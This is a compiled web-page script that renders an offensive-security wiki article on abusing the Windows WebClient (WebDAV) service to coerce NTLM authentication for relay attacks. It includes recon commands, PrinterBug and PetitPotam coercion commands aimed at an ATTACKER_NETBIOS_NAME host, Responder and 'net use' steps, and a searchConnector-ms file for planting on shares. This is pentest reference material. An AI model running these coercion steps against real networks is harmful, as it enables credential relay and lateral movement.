import{_ as o,c as p,a5 as r,G as i,w as a,B as h,o as d,j as e,a as t}from"./chunks/framework.B5CpDqM0.js";const C=JSON.parse('{"title":"WebClient abuse (WebDAV)","description":"","frontmatter":{"authors":"ShutdownRepo, mpgn, sckdev, Pri3st, rtpt-romankarwacik"},"headers":[],"relativePath":"ad/movement/mitm-and-coerced-authentications/webclient.md","filePath":"ad/movement/mitm-and-coerced-authentications/webclient.md","lastUpdated":1727188700000}'),k={name:"ad/movement/mitm-and-coerced-authentications/webclient.md"};function c(u,s,g,b,F,m){const n=h("PluginTabsTab"),l=h("PluginTabs");return d(),p("div",null,[s[8]||(s[8]=r('<h1 id="webclient-abuse-webdav" tabindex="-1">WebClient abuse (WebDAV) <a class="header-anchor" href="#webclient-abuse-webdav" aria-label="Permalink to &quot;WebClient abuse (WebDAV)&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><blockquote><p>Web Distributed Authoring and Versioning (WebDAV) is an extension to Hypertext Transfer Protocol (HTTP) that defines how basic file functions such as copy, move, delete, and create are performed by using HTTP (<a href="https://docs.microsoft.com/en-us/windows/win32/webdav/webdav-portal" target="_blank" rel="noreferrer">docs.microsoft.com</a>)</p></blockquote><p>The WebClient service needs to be enabled for WebDAV-based programs and features to work. As it turns out, the WebClient service can be indirectly abused by attackers to coerce authentications. This technique needs to be combined with other coercion techniques (e.g. <a href="./ms-efsr">PetitPotam</a>, <a href="./ms-rprn">PrinterBug</a>) to act as a booster for these techniques. It allows attackers to elicit authentications made over HTTP instead of SMB, hence heightening <a href="./../ntlm/relay">NTLM relay</a> capabilities.</p><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2><h3 id="recon" tabindex="-1">Recon <a class="header-anchor" href="#recon" aria-label="Permalink to &quot;Recon&quot;">​</a></h3><p>Attackers can remotely enumerate systems on which the WebClient is running, which is not uncommon in organizations that use OneDrive or SharePoint or when mounting drives with a WebDAV connection string.</p>',7)),i(l,null,{default:a(()=>[i(n,{label:"UNIX-like"},{default:a(()=>s[0]||(s[0]=[e("p",null,[t("From UNIX-like systems, this can be achieved with "),e("a",{href:"https://github.com/Hackndo/WebclientServiceScanner",target:"_blank",rel:"noreferrer"},"webclientservicescanner"),t(" (Python) or using "),e("a",{href:"https://github.com/Pennyw0rth/NetExec",target:"_blank",rel:"noreferrer"},"NetExec"),t(" (Python).")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"webclientservicescanner"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'domain.local'/'user':'password'@'machine'")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"netexec"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," smb"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'TARGETS'"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -d"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'domain'"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'user'"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'password'"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -M"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," webdav")])])])],-1)])),_:1}),i(n,{label:"Windows"},{default:a(()=>s[1]||(s[1]=[e("p",null,[t("From Windows systems, this can be achived with "),e("a",{href:"https://github.com/G0ldenGunSec/GetWebDAVStatus",target:"_blank",rel:"noreferrer"},"GetWebDAVStatus"),t(" (C, C#)")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"GetWebDAVStatus.exe"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'machine'")])])])],-1)])),_:1})]),_:1}),s[9]||(s[9]=r(`<h3 id="abuse" tabindex="-1">Abuse <a class="header-anchor" href="#abuse" aria-label="Permalink to &quot;Abuse&quot;">​</a></h3><p>Regular coercion techniques rely on the attacker forcing a remote system to authenticate to another one. The &quot;other&quot; system is usually an IP address, a domain or NetBIOS name. With WebClient abuse, the other system needs to be supplied in a WebDAV Connection String format.</p><p>The WebDAV Connection String format is: <code>\\\\SERVER@PORT\\PATH\\TO\\DIR</code>.</p><div class="tip custom-block"><p>To retrieve an authenticated connection, the remote server that attacker wants to victim to be relayed to <a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#getting-intranet-zoned" target="_blank" rel="noreferrer">should be considered in the intranet zone</a>. One way to do it is to use the NetBIOS or DNS name of the attacker machine instead of its IP address.</p><p>In order to have a valid NetBIOS name, <a href="https://github.com/lgandx/Responder" target="_blank" rel="noreferrer">Responder</a> can be used.</p><p>A heftier alternative is to do some <a href="./adidns-spoofing">ADIDNS poisoning</a> to create and use a valid DNS entry.</p></div><p>Below are a few examples of WebClient abuse with <a href="./../print-spooler-service/printerbug">PrinterBug</a> and <a href="./ms-efsr">PetitPotam</a>.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># PrinterBug</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">dementor.py</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -d</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;DOMAIN&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;USER&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -p</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;PASSWORD&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;ATTACKER_NETBIOS_NAME@PORT/print&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;VICTIM_IP&quot;</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">SpoolSample.exe</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;VICTIM_IP&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;ATTACKER_NETBIOS_NAME@PORT/print&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># PetitPotam</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Petitpotam.py</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;ATTACKER_NETBIOS_NAME@PORT/randomfile.txt&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;VICTIM_IP&quot;</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Petitpotam.py</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -d</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;DOMAIN&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;USER&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -p</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;PASSWORD&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;ATTACKER_NETBIOS_NAME@PORT/randomfile.txt&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;VICTIM_IP&quot;</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">PetitPotam.exe</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;ATTACKER_NETBIOS_NAME@PORT/randomfile.txt&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;VICTIM_IP&quot;</span></span></code></pre></div><h3 id="start-the-webclient-service" tabindex="-1">Start the WebClient service <a class="header-anchor" href="#start-the-webclient-service" aria-label="Permalink to &quot;Start the WebClient service&quot;">​</a></h3><p>On a side note, making a remote system start the WebClient service can be done in many ways</p>`,8)),i(l,null,{default:a(()=>[i(n,{label:"Map a WebDAV server"},{default:a(()=>s[2]||(s[2]=[e("p",null,[t("By mapping a remote WebDAV server. This can be done by having Responder's server up and by running the "),e("code",null,"net use"),t(" cmdlet.")],-1),e("div",{class:"language-shell vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"shell"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# starting responder (in analyze mode to prevent poisoning)")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"responder"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --interface"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "eth0"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --analyze")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"responder"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -I"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "eth0"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -A")]),t(`
`),e("span",{class:"line"}),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# map the drive from the target WebClient needs to be started on")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"net"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," use"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," x:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," http://"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$RESPONDER_IP"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/")])])])],-1)])),_:1}),i(n,{label:"searchConnector-ms"},{default:a(()=>s[3]||(s[3]=[e("p",null,[t("With a "),e("a",{href:"https://docs.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry",target:"_blank",rel:"noreferrer"},"searchConnector-ms"),t(" file uploaded to widely used share within the organisation. Each time a user browses the folder, the WebClient service will start transparently.")],-1),e("div",{class:"language-xml vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"xml"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},'xml version="1.0" encoding="UTF-8"?')]),t(`
`),e("span",{class:"line"}),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Microsoft Outlook")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"false")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"true")]),t(`
`),e("span",{class:"line"}),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"{91475FE5-586B-4EBA-8D75-D17434B8CDF6}")]),t(`
`),e("span",{class:"line"}),t(`
`),e("span",{class:"line"}),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"https://whatever/")])])])],-1)])),_:1}),i(n,{label:"Explorer"},{default:a(()=>s[4]||(s[4]=[e("p",null,"By opening an interactive session with the target (e.g. RDP), opening the Explorer, and type something in the address bar.",-1)])),_:1}),i(n,{label:"Service trigger"},{default:a(()=>s[5]||(s[5]=[e("p",null,[t("According to "),e("a",{href:"https://www.tiraniddo.dev/2015/03/starting-webclient-service.html",target:"_blank",rel:"noreferrer"},"tiraniddo's research"),t(", the webclient service is registered with a service trigger, meaning it can be started automatically in response to a specific system event. A simple way to start the service in an unprivileged session is by compiling and executing the following "),e("a",{href:"https://gist.github.com/klezVirus/af004842a73779e1d03d47e041115797",target:"_blank",rel:"noreferrer"},"C# PoC"),t(" created by "),e("a",{href:"https://gist.github.com/klezVirus",target:"_blank",rel:"noreferrer"},"klezVirus"),t(".")],-1)])),_:1}),i(n,{label:"SharpStartWebclient"},{default:a(()=>s[6]||(s[6]=[e("p",null,[t("By compiling and executing the "),e("a",{href:"https://github.com/eversinc33/SharpStartWebclient",target:"_blank",rel:"noreferrer"},"SharpStartWebclient"),t(" tool created by "),e("a",{href:"https://github.com/eversinc33",target:"_blank",rel:"noreferrer"},"eversinc33")],-1)])),_:1}),i(n,{label:"Beacon Object File"},{default:a(()=>s[7]||(s[7]=[e("p",null,[t("By using the following "),e("a",{href:"https://github.com/outflanknl/C2-Tool-Collection/blob/main/BOF/StartWebClient/SOURCE/StartWebClient.c",target:"_blank",rel:"noreferrer"},"BOF (Beacon Object File)"),t(" created by "),e("a",{href:"https://github.com/outflanknl",target:"_blank",rel:"noreferrer"},"outflanknl"),t(".")],-1)])),_:1})]),_:1}),s[10]||(s[10]=r('<h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">​</a></h2><p><a href="https://www.webdavsystem.com/server/access/windows" target="_blank" rel="noreferrer">https://www.webdavsystem.com/server/access/windows</a><a href="https://pentestlab.blog/2021/10/20/lateral-movement-webclient" target="_blank" rel="noreferrer">https://pentestlab.blog/2021/10/20/lateral-movement-webclient</a><a href="https://www.tiraniddo.dev/2015/03/starting-webclient-service.html" target="_blank" rel="noreferrer">https://www.tiraniddo.dev/2015/03/starting-webclient-service.html</a></p>',2))])}const f=o(k,[["render",c]]);export{C as __pageData,f as default};
